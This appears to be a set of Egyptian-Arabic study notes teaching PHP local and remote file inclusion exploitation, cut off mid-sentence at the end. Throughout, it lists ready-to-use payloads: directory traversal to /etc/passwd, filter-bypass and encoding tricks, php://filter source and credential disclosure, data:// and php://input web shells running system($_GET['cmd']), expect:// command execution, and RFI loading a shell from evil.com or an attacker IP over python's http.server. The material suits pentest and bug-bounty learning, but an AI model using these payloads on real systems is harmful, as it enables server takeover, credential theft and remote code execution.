# Layer 1


---

## أول حاجة: يعني إيه File Inclusion أصلاً؟

ببساطة جدًا  
أي موقع ويب بيبقى محتاج يعرض صفحات مختلفة (About - Contact - Home... إلخ)

بدل ما يعمل صفحة HTML لكل حاجة لوحدها، بيستخدم **باراميتر في الرابط** يحدد إيه الصفحة اللي تتعرض.

زي المثال ده:

```
index.php?page=about
```

هنا:

- `index.php` = الصفحة الأساسية
    
- `page=about` = قولنا للسيستم "اعرض صفحة about"
    

---

## ليه بيعملوا كده؟

علشان:

1. يقللوا تكرار الكود
    
2. يبقى أسهل يعدلوا على الموقع
    
3. يستخدموا حاجة اسمها **Templating Engine**
    

---

## يعني إيه Templating Engine؟

تخيل إن الموقع كله ليه شكل ثابت:

- Header
    
- Navbar
    
- Footer
    

واللي بيتغير بس هو **المحتوى**

فالسيستم بيعمل كده:

- يحمل الشكل الثابت
    
- وبعدين يجيب المحتوى حسب الباراميتر
    

يعني:

```
index.php?page=about
```

هيعمل:

- Header
    
- Navbar
    
- Footer
    
- ويجيب محتوى `about.php`
    

---

## فين المشكلة بقى؟

المشكلة بتحصل لما:

السيستم **يخليك تتحكم في اسم الملف اللي هيتفتح**  
من غير ما يعمل validation أو filtering

---

## هنا بقى بنوصل لـ LFI

### Local File Inclusion (LFI)

يعني إيه؟

إنك تقدر تخلي السيرفر يفتح **أي فايل من على الجهاز نفسه (السيرفر)**

---

## مثال يوضح الفكرة

لو الموقع بيعمل كده:

```php
include($_GET['page']);
```

وانت كتبت:

```
?page=about.php
```

هيفتح:

```
about.php
```

لكن لو انت بدلتها بـ:

```
?page=../../../../etc/passwd
```

هنا انت بتحاول:

- تطلع بره الفولدر
    
- وتقرأ فايل من النظام
    

وده اسمه:

### Directory Traversal + LFI

---

## ليه ده خطر؟

لأنك ممكن توصل لـ:

### 1. Source Code

تشوف كود الموقع  
وده بيساعدك تلاقي ثغرات تانية

---

### 2. Sensitive Data

زي:

- passwords
    
- API keys
    
- config files
    

---

### 3. Credentials

ممكن تلاقي:

- DB username/password
    
- admin login
    

---

### 4. Remote Code Execution (RCE)

في حالات معينة تقدر:

- تنفذ كود على السيرفر
    
- تاخد control كامل
    

---

## مثال عملي: Language Parameter

موقع بيستخدم:

```
?language=en
```

وبيعمل:

```
/en/
/es/
```

لو انت تحكمت في القيمة دي، ممكن تقول:

```
?language=../../../../etc/passwd
```

وساعتها:

- السيرفر يجيب فايل مش مفروض تشوفه
    

---

## دلوقتي ندخل على الكود في لغات مختلفة

---

## PHP

أشهر مثال:

```php
include($_GET['language']);
```

المشكلة هنا:

- بياخد input من اليوزر
    
- يحطه مباشرة في include
    

يعني:  
أي حاجة تكتبها = هتتفتح

---

### دوال خطيرة في PHP:

- include()
    
- include_once()
    
- require()
    
- require_once()
    
- file_get_contents()
    

كلهم:  
بياخدوا path → ويفتحوا فايل

---

## NodeJS

مثال:

```js
fs.readFile(path.join(__dirname, req.query.language), ...)
```

هنا:

- بياخد parameter
    
- ويحطها في file path
    

---

كمان:

```js
res.render(`/${req.params.language}/about.html`);
```

لو غيرت:

```
/about/en
```

إلى:

```
/about/../../secret
```

ممكن توصل لفايل مش المفروض

---

## Java (JSP)

```jsp
<jsp:include file="<%= request.getParameter('language') %>" />
```

نفس الفكرة:

- input من user
    
- يتحط في include
    

---

## .NET

```cs
Response.WriteFile(HttpContext.Request.Query['language'])
```

أو:

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

كلها نفس المشكلة:  
User controls file path

---

## نقطة مهمة جدًا: Read vs Execute

مش كل الفنكشنز زي بعض

---

### Read بس (قراءة)

يعني:

- يفتح الفايل
    
- يعرض المحتوى
    

زي:

- file_get_contents
    
- fs.readFile
    

---

### Execute (تنفيذ)

يعني:

- يشغل الكود اللي جوا الفايل
    

زي:

- include في PHP
    
- render في NodeJS
    

---

## ليه دي نقطة مهمة؟

لأن:

### لو Read بس:

هتقدر:

- تقرأ الكود
    
- تسرب بيانات
    

---

### لو Execute:

تقدر:

- تشغل كود
    
- تعمل RCE
    
- تسيطر على السيرفر
    

---

## كمان حاجة: Remote URL

بعض الفنكشنز تسمح:

```
include("http://evil.com/shell.php")
```

وده اسمه:

### RFI (Remote File Inclusion)

---

## الخلاصة المهمة

لو لقيت:

- Parameter في URL
    
- بيتحكم في file path
    
- مفيش validation
    

يبقى غالبًا:

### عندك LFI

---

## ليه LFI تعتبر خطيرة جدًا؟

حتى لو مجرد قراءة:

- تسرّب source code
    
- تلاقي secrets
    
- توصل لثغرات تانية
    
- ممكن تتحول لـ RCE
    

---

## نصيحة مهمة في البج باونتي

دور على:

- `?page=`
    
- `?file=`
    
- `?lang=`
    
- `?view=`
    

وجرب:

```
../../../../etc/passwd
```
![[Pasted image 20260422010934.png]]


---
# Layer 2

---

## أول حاجة: Basic LFI (الاستغلال المباشر)

عندك موقع فيه:

```id="f9s1"
index.php?language=es.php
```

لما تغيّر اللغة:

- الموقع بيعرض محتوى مختلف
    
- وبيغير الفايل اللي بيتحمل
    

### الفكرة هنا:

لو الموقع بيعمل include للفايل ده  
يبقى انت تقدر تغيّر اسم الفايل

---

## التجربة الأساسية

بدل:

```id="a1x"
?language=es.php
```

جرب:

```id="b2y"
?language=/etc/passwd
```

---

## إيه اللي حصل؟

السيرفر فتح فايل:

```id="c3z"
/etc/passwd
```

وده فايل سيستم في لينكس فيه:

- أسماء اليوزرز
    
- معلومات عنهم
    

---

## الاستنتاج المهم

طالما عرفت تقرأ فايل من السيرفر  
يبقى عندك:

### LFI Vulnerability

---

## تاني حاجة: Path Traversal (أهم نقطة)

---

## المشكلة اللي بتقابلك

المطور ممكن يكون عامل كده:

```php
include("./languages/" . $_GET['language']);
```

---

## يعني إيه ده؟

لو انت كتبت:

```id="e5b"
?language=es.php
```

السيرفر هيقرأ:

```id="f6c"
./languages/es.php
```

---

## طب لو جربت:

```id="g7d"
?language=/etc/passwd
```

هيبقى:

```id="h8e"
./languages//etc/passwd
```

وده غالبًا:  
مش موجود → error

---

## الحل: Path Traversal

نستخدم:

```id="i9f"
../
```

---

## يعني إيه ../ ؟

ده معناه:  
اطلع فولدر لفوق

---

## مثال

لو المسار:

```id="j10"
/var/www/html/languages/
```

---

### لما تكتب:

```id="k11"
../
```

يبقى:

```id="l12"
/var/www/html/
```

---

### لما تكتب:

```id="m13"
../../
```

يبقى:

```id="n14"
/var/www/
```

---

## الاستغلال

```id="o15"
?language=../../../../etc/passwd
```

---

## ليه اشتغلت؟

لأنك:

1. طلعت لفوق كذا فولدر
    
2. وصلت للروت /
    
3. طلبت فايل حقيقي موجود
    

---

## نقطة ذكية جدًا

حتى لو زودت ../ كتير  
مش مشكلة

ليه؟

لأن:  
لو وصلت للروت `/`  
أي ../ زيادة → تفضل في نفس المكان

---

## نصيحة احترافية

في الريال:

- حاول تقلل عدد ../
    
- عشان:
    
    - تبقى فاهم المسار
        
    - تبقى شكلك professional في الريپورت
        

---

## تالت حاجة: Filename Prefix

---

## المشكلة

المطور يعمل كده:

```php
include("lang_" . $_GET['language']);
```

---

## لو عملت:

```id="q17"
?language=../../etc/passwd
```

هيبقى:

```id="r18"
lang_../../etc/passwd
```

وده:  
غلط → مش هيفتح

---

## الحل

تزود `/` في الأول:

```id="s19"
?language=/../../../../etc/passwd
```

---

## ليه اشتغلت؟

لأن:

- `/` بيكسر الـ prefix
    
- وبيخلي السيستم يتعامل مع path حقيقي
    

---

## خد بالك

مش دايمًا بتشتغل  
على حسب:

- هل في فولدر اسمه lang_ ولا لأ
    
- شكل السيرفر
    

---

## رابع حاجة: Appended Extensions

---

## المشكلة

المطور يعمل:

```php
include($_GET['language'] . ".php");
```

---

## لو عملت:

```id="u21"
?language=/etc/passwd
```

هيبقى:

```id="v22"
/etc/passwd.php
```

وده:  
مش موجود

---

## الحل؟

فيه تكنيكات (هتتعلمها بعدين) زي:

- null byte
    
- wrappers
    
- encoding tricks
    

بس هنا المهم تفهم:

### إن الامتداد ممكن يمنعك

---

## خامس حاجة: اقرأ ولا ينفذ؟

---

## تجربة مهمة

لو طلبت:

```id="w23"
?language=index.php
```

---

## ممكن يحصل حاجتين:

### 1. يديك الكود

يبقى:

- read فقط
    

---

### 2. يشغل الصفحة

يبقى:

- execute
    

---

## ودي نقطة مهمة جدًا

لأن:

- read → info leak
    
- execute → ممكن RCE
    

---

## سادس حاجة: Second-Order LFI

دي بقى شوية advanced

---

## الفكرة

مش بتهاجم parameter مباشر  
لكن:  
بتزرع payload في الداتا

---

## مثال

موقع عنده:

```id="x24"
/profile/mohab/avatar.png
```

---

## لو غيرت username بتاعك لـ:

```id="y25"
../../../etc/passwd
```

---

## إيه اللي يحصل؟

لما الموقع يجيب الصورة:

```id="z26"
/profile/../../../etc/passwd/avatar.png
```

ممكن:

- يقرأ فايل تاني بدل الصورة
    

---

## ليه اسمها Second-Order؟

لأن:

- انت حطيت payload الأول
    
- واتنفذ بعدين في مكان تاني
    

---

## ليه دي خطيرة؟

لأن:  
المطور بيقول:

- "دي داتا من الداتابيز → آمنة"
    

لكن الحقيقة:  
انت اللي حاططها

---

## الخلاصة اللي لازم تثبت في دماغك

أي LFI بيبقى فيه 3 حاجات:

1. Input من user
    
2. بيتحط في file path
    
3. مفيش validation
    

---

## خطوات الاستغلال

1. جرّب direct path:
    

```id="a27"
/etc/passwd
```

2. لو منفعش:  
    استخدم:
    

```id="b28"
../../../../etc/passwd
```

3. لو في prefix:  
    جرّب:
    

```id="c29"
/../../../../etc/passwd
```

4. لو في extension:  
    اعرف إنك محتاج bypass
    

---

## أهم فايلات تجربها

### Linux:

```id="d30"
/etc/passwd
/etc/hosts
```

### Windows:

```id="e31"
C:\Windows\boot.ini
```

---

## أهم نقطة كمهاجم

LFI مش الهدف النهائي

لكن:

### Step 1 → Info Leak

### Step 2 → Privilege Escalation

### Step 3 → RCE

---

# Layer 3
**إزاي تكسر الفلاتر (Bypass)** لما الموقع يحاول يحمي نفسه من LFI.

هقسمهولك بشكل منطقي، وكل نقطة هفهمك:

- المشكلة
    
- الفلتر بيعمل إيه
    
- إزاي تكسره
    
- ليه البايباس شغال
    

---

## أول نوع: Non-Recursive Path Traversal Filter

## المشكلة

المطور عامل فلتر بسيط:

```php
$language = str_replace('../', '', $_GET['language']);
```

---

## الفلتر ده بيعمل إيه؟

ببساطة:

- يشيل أي `../` من ال input
    

---

## لو هاجمت عادي:

```url
?language=../../../../etc/passwd
```

هيتحول لـ:

```url
/etc/passwd  →  تبقى languages/etc/passwd
```

يعني:  
الهجوم اتكسر

---

## فين الغلطة؟

الفلتر:

- بيشتغل مرة واحدة بس
    
- مش recursive (مش بيكرر نفسه)
    

---

## البايباس

نستخدم payload زي:

```url
....//....//....//....//etc/passwd
```

---

## ليه ده اشتغل؟

خلينا نفهم:

### payload:

```url
....//
```

الفلتر يشوف:

- فيه `../` جواها → يشيله
    

يتبقى:

```url
../
```

---

## النتيجة

الفلتر بنفسه:  
حول payload خبيث → payload صالح

وده غباء كلاسيكي من المطور

---

## أشكال تانية للبايباس

- `..././`
    
- `....\/`
    
- `....////`
    

كلهم بيعتمدوا على:

### إنك تخدع الفلتر مش السيستم

---

## تاني نوع: Encoding Bypass

---

## المشكلة

الموقع يمنع:

- `.`
    
- `/`
    

---

## الحل

نعمل URL Encoding

---

## مثال

بدل:

```url
../
```

نكتب:

```url
%2e%2e%2f
```

---

## ليه ده بيشتغل؟

لأن:

1. الفلتر يشوف:
    

```
%2e%2e%2f
```

→ مش فاهمها → يعديها

2. السيرفر يفكها:
    

```
../
```

---

## payload كامل:

```url
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## Double Encoding

ممكن تعمل encode مرتين:

```url
%252e%252e%252f
```

---

## ليه؟

لأن:

- الفلتر يفك مرة
    
- السيرفر يفك مرة تانية
    

---

## نقطة مهمة

لازم:

- تعمل encode لكل حاجة
    
- حتى النقطة `.`
    

---

## تالت نوع: Approved Paths (Regex)

---

## المشكلة

المطور عامل check:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language']))
```

---

## يعني إيه؟

لازم:

- يبدأ بـ `./languages/`
    

---

## لو كتبت:

```url
../../../../etc/passwd
```

هترفض

---

## الحل

نرضي الفلتر الأول:

```url
./languages/../../../../etc/passwd
```

---

## ليه ده اشتغل؟

- الفلتر شاف:
    
    - البداية صح → تمام
        
- السيرفر نفذ:
    
    - traversal → وصل للفايل
        

---

## الفكرة العامة

### خد الفلتر على قد عقله

---

## ممكن تدمجها مع:

- Encoding
    
- Recursive bypass
    

---

## رابع نوع: Appended Extension (.php)

---

## المشكلة

المطور يعمل:

```php
include($_GET['language'] . ".php");
```

---

## لو هاجمت:

```url
/etc/passwd
```

هيبقى:

```url
/etc/passwd.php
```

→ مش موجود

---

## الحلول هنا نوعين:

### 1. حديثة (صعبة)

مش دايمًا ينفع تكسرها

---

### 2. قديمة (مهمة تعرفها)

---

## تقنية: Path Truncation

---

## الفكرة

PHP زمان كان عنده limit:

```text
4096 characters
```

---

## لو عدّيت الحد:

أي حاجة بعده:  
→ تتقص

---

## الاستغلال

نخلي:

- `.php` تيجي بعد الحد
    
- فتتقص
    

---

## payload:

```url
non_existing/../../../etc/passwd/././././././...
```

(تكرر ./ كتير)
![[Pasted image 20260626173651.png]]

---

## ليه اشتغل؟

- السلسلة اتقصت
    
- `.php` اختفت
    
- فضل:
    

```
/etc/passwd
```

---

## ملاحظات

- لازم تبدأ بـ فولدر مش موجود
    
- تحسب الطول كويس
    

---

## تقنية: Null Byte Injection

---

## الفكرة

زمان:  
PHP كان بيقف عند:

```text
%00
```

---

## payload:

```url
/etc/passwd%00
```

---

## لما يتحط مع:

```php
include($_GET['language'] . ".php");
```

يبقى:

```url
/etc/passwd%00.php
```

---

## النتيجة

السيستم يشوف:

```
/etc/passwd
```

---

## ليه؟

لأن:

- `%00` = نهاية string في الذاكرة
    

---

## مهم جدًا

- دي شغالة بس في PHP قديم (< 5.5)
    
- بس لازم تبقى عارفها
    

---

## الخلاصة الاحترافية

---

## لما تقابل LFI محمي

فكر كده:

### 1. هل في filter على ../ ؟

جرب:

- `....//`
    
- `..././`
    

---

### 2. هل في منع لـ / أو . ؟

جرب:

- URL encoding
    
- double encoding
    

---

### 3. هل في path معين لازم يبدأ بيه؟

ابدأ بيه:

```url
./languages/../../..
```

---

### 4. هل في .php بتتضاف؟

فكر في:

- null byte
    
- truncation
    
- أو استغل PHP files بدل system files
    

---

## أهم Mindset

أنت مش بتحاول تكسر السيرفر  
أنت بتحاول:

### "تعدي الفلتر"

---
# Layer 4

## أولًا: يعني إيه PHP Wrappers؟

في PHP فيه حاجة اسمها **Wrappers**  
دي طرق خاصة تقدر تتعامل بيها مع:

- فايلات
    
- memory
    
- input/output
    

بدل ما تكتب:

```id="a1"
config.php
```

تقدر تكتب:

```id="a2"
php://something
```

وده يخلي PHP يتعامل مع الداتا بطريقة مختلفة

---

## أهم Wrapper هنا: php://filter

ده أهم واحد في LFI

---

## بيشتغل إزاي؟

الصيغة العامة:

```id="a3"
php://filter/read=FILTER/resource=FILE
```

---

## كل جزء معناه إيه؟

### 1. php://filter

ده بيقول:  
"أنا هستخدم فلتر على الداتا"

---

### 2. read=

يعني:  
هتطبق الفلتر على **القراءة**

---

### 3. FILTER

نوع الفلتر  
وأهم واحد لنا:

```id="a4"
convert.base64-encode
```

---

### 4. resource=

ده أهم جزء  
بتحدد:  
الملف اللي عايز تقرأه

---

## ليه بنستخدم Base64؟

---

## المشكلة

لو عملت LFI عادي على فايل PHP:

```id="a5"
?language=config
```

---

## اللي بيحصل

PHP:

- بيشغل الفايل
    
- مش بيوريك الكود
    

---

## النتيجة

ممكن تشوف:

- صفحة فاضية
    
- أو HTML بس
    

---

## الحل

نمنع التنفيذ  
ونخلي السيرفر:

### "يعرض الكود بدل ما يشغله"

---

## إزاي؟

نستخدم:

```id="a6"
convert.base64-encode
```

---

## ليه Base64؟

لأن:

- السيرفر مش هيشغل الكود
    
- هيحوّله لنص مشفر
    
- وانت تفكه بعدين
    

---

## الاستغلال العملي

---

## بدل ما تكتب:

```id="a7"
?language=config
```

اكتب:

```id="a8"
?language=php://filter/read=convert.base64-encode/resource=config
```


---

## لو الموقع بيضيف .php

هيبقى:

```id="a9"
config.php
```

تمام جدًا

---

## النتيجة

هتاخد:  
string طويل شبه:

```id="a10"
PD9waHAKICBjb25maWcgY29kZSBoZXJl...
```

---

## فك التشفير

---

## في لينكس:

```bash
echo "STRING" | base64 -d
```

---

## أو أونلاين

---

## النتيجة

هتشوف:

```php
$db_password = "123456";
```

---

## ليه ده مهم جدًا؟

---

## لأنك بتسرّب:

### 1. Credentials

- DB password
    
- API keys
    

---

### 2. Secrets

- tokens
    
- internal configs
    

---

### 3. Logic

تفهم:

- السيستم شغال إزاي
    
- فين الثغرات
    

---

## خطوة مهمة قبل كده: Fuzzing

---

## يعني إيه؟

تدور على فايلات PHP موجودة

---

## ليه؟

علشان:

- تقرأها بالـ filter
    
- تستخرج منها معلومات
    

---

## مثال:

```bash
ffuf -w wordlist.txt -u http://target/FUZZ.php
```

---

## ممكن تلاقي:

- index.php
    
- config.php
    
- admin.php
    

---

## نقطة ذكية جدًا

مش لازم status يكون 200

حتى:

- 403
    
- 302
    

ممكن تقرأهم بـ LFI

---

## الفرق بين LFI عادي و Filter

---

## LFI عادي:

```id="a14"
include("config.php")
```

→ يتنفذ

---

## بالـ filter:

```id="a15"
php://filter/read=convert.base64-encode/resource=config
```

→ يتقرأ كـ نص

---

## سيناريو مهم جدًا

---

## عندك:

- LFI
    
- وفيه .php appended
    

---

## مش عارف تجيب /etc/passwd

---

## لكن تقدر تعمل:

```id="a16"
php://filter/read=convert.base64-encode/resource=index
```

---

## كده تقدر:

- تقرأ كل سورس كود الموقع
    
- حتى لو مقفول
    

---

## نقطة احترافية

---

## ابدأ بـ:

```id="a17"
index.php
```

---

## ليه؟

لأنه:

- بيبقى المدخل الأساسي
    
- فيه includes لباقي الملفات
    

---

## بعد كده:

- شوف فيه include لإيه
    
- روح اقرأه
    

---

## وهكذا

تعمل:

### Recursive Source Disclosure

---

## ملحوظة مهمة جدًا

---

## لازم تنسخ كل الـ Base64

لو نسيت جزء:

- decode هيفشل
    
- الكود يطلع بايظ
    

---

## الخلاصة

---

## php://filter بيخليك:

بدل:  
تشغل الكود

تقدر:

### "تسرّب الكود"

---

## أهم استخداماته:

- قراءة config files
    
- استخراج credentials
    
- فهم السيستم
    
- تمهيد لـ RCE
    

---

## Mindset

LFI + php://filter =

مش مجرد قراءة فايل  
لكن:

### "Full source code access"

---

لو عايز نكمل الجزء اللي بعده (وده أخطر حاجة بقى):

- php://input
    
- log poisoning
    
- تحويل LFI لـ RCE فعلي
    

ده المستوى اللي يخليك تكتب reports تقيلة فعلًا


# Layer 5

---

## الأول... يعني إيه PHP Wrapper؟

ببساطة جدًا...

PHP فيها حاجة اسمها **Wrappers**.

بدل ما تقوله:

```php
include("file.php");
```

ممكن تقوله:

```php
include("php://filter/...");
```

أو

```php
include("data://...");
```

أو

```php
include("php://input");
```

يعني بدل ما يقرأ File عادي، يقرأ من مصدر تاني.

كأنك بتقوله:

> "متقرأش من الهارد... اقرأ من الذاكرة."

أو

> "اقرأ من الـ POST."

أو

> "اقرأ من Base64."

---

## ليه Wrappers مهمة؟

احنا قبل كده كنا بنعمل LFI عشان نقرأ ملفات:

```
?page=../../../../etc/passwd
```

وده كان أقصى حاجة نقدر نعملها.

لكن باستخدام Wrappers ممكن نخلي الـ include ينفذ كود PHP.

يعني بدل:

```
include("/etc/passwd");
```

يبقى:

```
include("كود PHP")
```

وده معناه...

**Remote Code Execution.**

---

## أول Wrapper

## Data Wrapper

```
data://
```

وده أخطر واحد وأسهلهم.

---

## فكرته

بدل ما تبعت اسم ملف...

بتبعت الكود نفسه.

يعني:

بدل

```
include("test.php")
```

تعمل

```
include("<?php system($_GET['cmd']); ?>")
```

بس PHP مش هتفهمه كده مباشرة.

علشان كده بنعمله Base64.

---

## ليه Base64؟

لأن الـ URL مينفعش يبقى فيه:

```
<
>
?
'
"
```

فبنحوله Base64.

مثلاً

الكود

```php
<?php system($_GET['cmd']); ?>
```

يتحول

```
PD9waHAgc3lzdGVtK...
```

---

بعدها نبعته بالشكل ده

```
data://text/plain;base64,PD9waHA...
```

يعني

```
اقرأ النص ده

هو Base64

وفكه
```

---

## شكل الريكوست

```
?page=data://text/plain;base64,PD9wa...
```

لما الـ include ينفذه...

هيبقى كأنه كتب

```php
<?php system($_GET['cmd']); ?>
```

داخل الصفحة.

يبقى بقى عندك Web Shell.

---

## بعدها

تقدر تبعت

```
&cmd=id
```

أو

```
&cmd=whoami
```

أو

```
&cmd=uname -a
```

فالسيرفر ينفذهم.

![[Pasted image 20260626175819.png]]

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
أولًا نفك الـ URL Encoding:
```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

نفك البيز 
<?php system($_GET["cmd"]); ?>

---

## يبقى الـ Flow كله

```
LFI

↓

include()

↓

data://

↓

PHP Shell

↓

system()

↓

RCE
```

---

## لكن...

مش دايمًا الـ data wrapper شغال.

ليه؟

لازم يكون فى إعداد فى PHP اسمه

```
allow_url_include
```

لو Off

يبقى مش هيشتغل.

---

## إزاى أعرف؟

بما إن عندى LFI...

أقرأ ملف

```
php.ini
```

وده موجود غالبًا هنا

```
/etc/php/8.2/apache2/php.ini
```

أو

```
/etc/php/7.4/apache2/php.ini
```

بعدها أدور على

```
allow_url_include
```

لو لقيت

```
allow_url_include = On
```

يبقى تمام.

---

## ليه استخدموا php://filter؟

ملف

```
php.ini
```

فيه حروف ممكن تبوظ الصفحة.

فبيعملوا

```
php://filter/read=convert.base64-encode/resource=
```

علشان يقرأ الملف Base64.

وبعدين يفكوه عندهم.

---

## ثانى Wrapper

## php://input

ده شبه الـ Data Wrapper.

لكن الفرق الوحيد...

الكود مش بييجى من الـ URL.

بييجى من الـ POST Body.

---

بدل

```
GET
```

هيبقى

```
POST
```

مثلاً

Body

```php
<?php system($_GET['cmd']); ?>
```

والـ URL

```
?page=php://input
```

فالـ include يعمل

```
include(POST DATA)
```

---

يبقى

```
POST

↓

الكود

↓

php://input

↓

include()

↓

RCE
```

---

## مثال

Body

```php
<?php system($_GET["cmd"]); ?>
```

URL

```
?page=php://input&cmd=id
```

فينفذ

```
id
```

![[Pasted image 20260626180351.png]]

---

## إمتى أستخدمه؟

لما أقدر أبعت POST.

لكن لو الصفحة بتقبل GET بس...

مش هيشتغل.

---

## الفرق بين Data و Input

| Data                    | Input                   |
| ----------------------- | ----------------------- |
| الكود جوه الـ URL       | الكود جوه POST Body     |
| Base64 غالبًا           | PHP Code مباشرة         |
| محتاج allow_url_include | محتاج allow_url_include |

---

## ثالث Wrapper

## expect://

وده مختلف خالص.

---

فى الـ Data Wrapper

إحنا كنا بنحقن Web Shell.

أما هنا...

مش محتاج Web Shell أصلاً.

الـ Wrapper نفسه بينفذ أوامر.

يعنى

```
expect://id
```

هيشغل

```
id
```

مباشرة.

---

بدل

```php
system("id");
```

هو بنفسه بيعملها.

---

الريكوست

```
?page=expect://id
```

بس.

---

وده ينفذ

```
id
```

ويرجعلك

```
uid=33(www-data)
```

---

## هل expect موجود دائمًا؟

لأ.

وده أهم نقطة.

هو Extension خارجية.

يعنى لازم الأدمن يكون منزلها.

---

ممكن تشوف

```
extension=expect
```

فى

```
php.ini
```

لكن ده مش معناه إنها شغالة.

ممكن تكون:

- مش متسطبة
    
- فشل تحميلها
    
- فيها مشكلة
    

علشان كده لازم تجرب بنفسك

```
expect://id
```

لو اشتغل...

يبقى تمام.

---

## مقارنة بين الثلاثة

|Wrapper|بيعمل إيه؟|محتاج إيه؟|
|---|---|---|
|**data://**|يشغل PHP Code من الـ URL|`allow_url_include = On`|
|**php://input**|يشغل PHP Code من الـ POST Body|`allow_url_include = On`|
|**expect://**|يشغل أوامر النظام مباشرة|إضافة `expect` تكون متسطبة وشغالة|
![[Pasted image 20260626181538.png]]

---

## ازاى أفكر كبنتريشن تيستر؟

لما تلاقي LFI، متقفش عند إنك تقرأ `/etc/passwd` وخلاص. فكّر في خطوات تصعيد الاستغلال:

1. اقرأ `php.ini` باستخدام `php://filter`.
    
2. شوف هل `allow_url_include` مفعّل.
    
3. لو مفعّل، جرّب `data://` أو `php://input` للوصول إلى تنفيذ كود.
    
4. لو لقيت إعدادات تشير إلى `expect`، اختبر هل الـ `expect://` شغّال فعلًا.
    
5. لو ولا واحدة من دول نفعت، ساعتها تبدأ تدور على طرق تانية لتحويل الـ LFI إلى RCE (زي استغلال ملفات اللوج، رفع ملفات مع `phar://` أو `zip://`، وغيرها)، ودي هتتعلمها في الأجزاء اللي بعدها.
    

**الخلاصة:** الفكرة الأساسية في PHP Wrappers هي إنك تستغل وظيفة `include()` بحيث بدل ما تضم ملف عادي، تخليها تضم مصدر بيانات تاني يحتوي على كود PHP أو أوامر، وبالتالي تنتقل من مجرد **قراءة ملفات (LFI)** إلى **تنفيذ أوامر على السيرفر (RCE)** إذا كانت إعدادات السيرفر تسمح بذلك.

---
# Layer 6

الجزء ده يعتبر امتداد للي فات، بس الفرق إننا مش هنخدع الـ `include()` يقرأ من **Wrapper** زي `data://`، لأ... إحنا هنخليه يقرأ **ملف موجود على جهازنا إحنا**.

يعني بدل ما السيرفر يقرأ:

```php
include("page.php");
```

هيقرأ:

```php
include("http://Attacker-IP/shell.php");
```

وده اسمه **RFI - Remote File Inclusion**.

---

## الأول... يعني إيه RFI؟

إحنا اتعلمنا LFI.

يعني:

```php
include($_GET['page']);
```

وأبعت

```text
?page=../../../../etc/passwd
```

فالسيرفر يقرأ **ملف محلي**.

---

أما RFI فمعناه:

السيرفر يقرأ **ملف من على الإنترنت**.

يعني:

```text
?page=http://evil.com/shell.php
```

أو

```text
?page=http://192.168.1.5/shell.php
```

بدل ما يقرأ من الهارد...

يروح يحمل الملف من جهازك.

---

## الفرق بين LFI و RFI

|LFI|RFI|
|---|---|
|Local File|Remote File|
|يقرأ ملفات من السيرفر|يقرأ ملفات من جهاز المهاجم|
|غالبًا لقراءة الملفات|غالبًا لتنفيذ كود|

---

## ليه RFI أخطر؟

لأن بدل ما تقرأ ملفات...

أنت بنفسك بتدي السيرفر كود PHP ينفذه.

يعني:

أنا عندي جهاز

عليه ملف

```php
<?php system($_GET['cmd']); ?>
```

أخليه متاح على HTTP.

بعدها أقول للسيرفر:

```text
روح اقرأ الملف ده.
```

السيرفر هيحمله...

ويشغله.

يعني بقى عندك RCE.

---

## ليه مش كل LFI يبقى RFI؟

الناس كتير بتتلخبط هنا.

الرسمة دى هتوضحها.

```
              File Inclusion

              /           \
            LFI           RFI
```

كل RFI يعتبر LFI.

لكن مش كل LFI يعتبر RFI.

ليه؟

---

## السبب الأول

الفنكشن نفسها ممكن تمنع URLs.

يعني

```php
include()
```

يسمح

لكن

```php
readfile()
```

ممكن لأ حسب الاستخدام.

---

## السبب الثانى

ممكن أنت متحكمش فى أول الـ String.

مثلاً

```php
include("/var/www/" . $_GET['page']);
```

لو بعت

```text
http://evil.com
```

هيبقى

```text
/var/www/http://evil.com
```

وده طبعًا مش URL.

---

## السبب الثالث

وده الأشهر.

PHP نفسها قافلة RFI.

فى

```ini
allow_url_include = Off
```

وده الـ Default.

---

## طيب أعرف إزاى إنه RFI؟

أول طريقة

تقرأ

```text
php.ini
```

وتشوف

```ini
allow_url_include = On
```

لكن...

ده مش كفاية.

ليه؟

ممكن يكون On

بس الفنكشن مبتقبلش URL.

---

## الطريقة الصح

جرب.

ابعت URL.

مثلاً

```text
?page=http://127.0.0.1/index.php
```

لو الصفحة جابت محتوى

```text
index.php
```

يبقى RFI شغال.

---

لاحظ حاجة جميلة هنا.

هو جاب

```text
http://127.0.0.1
```

يعنى السيرفر نفسه عمل Request لنفسه.

وده يعتبر بداية لفكرة اسمها

**SSRF**

---

## يعنى إيه SSRF هنا؟

السيرفر هو اللى بيعمل Request.

مش أنت.

أنت قلتله

```
هاتلى الصفحة دى.
```

فهو عمل

```
GET http://127.0.0.1
```

وده معناه تقدر توصل لحاجات داخلية.

مثلاً

```text
127.0.0.1:8080
```

أو

```text
127.0.0.1:5000
```

أو

```text
localhost/admin
```

اللى أنت أصلاً متقدرش تشوفهم.

---

## طيب إزاى نوصل لـ RCE؟

أول خطوة.

نعمل Web Shell.

مثلاً

```php
<?php system($_GET['cmd']); ?>
```

ونسميه

```text
shell.php
```

---

بعدها لازم أخلى السيرفر يقدر يحمله.

وده ممكن بـ3 طرق.

---

## الطريقة الأولى

## HTTP

أسهل طريقة.

تشغل HTTP Server على جهازك.

مثلاً

```
python -m http.server 80
```

بقى عندك

```
http://Attacker-IP/shell.php
```

---

بعدها تقول للـ Target

```
include(
http://Attacker-IP/shell.php
)
```

فيعمل الآتى:

```
Target

↓

يروح عند جهازك

↓

يحمل shell.php

↓

يشغله

↓

يبقى عندك Web Shell
```

بعدها

```
&cmd=id
```

أو

```
&cmd=whoami
```

وهكذا.
![[Pasted image 20260626185124.png]]

---

### الرسمة

```
Attacker
│
├── shell.php
│
│
▼

HTTP Request

▼

Victim

↓

include()

↓

ينفذ PHP

↓

system()

↓

Command Execution
```

---

## ليه بيستخدموا Port 80 أو 443؟

لأن أغلب الـ Firewalls سامحة بيهم.

لو استخدمت

```
8888
```

ممكن يتقفل.

---

## Tip مهمة جدًا

لما تشغل الـ Python Server

هيظهرلك Log.

مثلاً

```
GET /shell.php
```

من هنا تعرف هل السيرفر طلب الملف فعلاً ولا لأ.

ولو لقيته طالب

```
shell.php.php
```

يبقى التطبيق بيضيف

```
.php
```

لوحده.

وساعتها تبعت

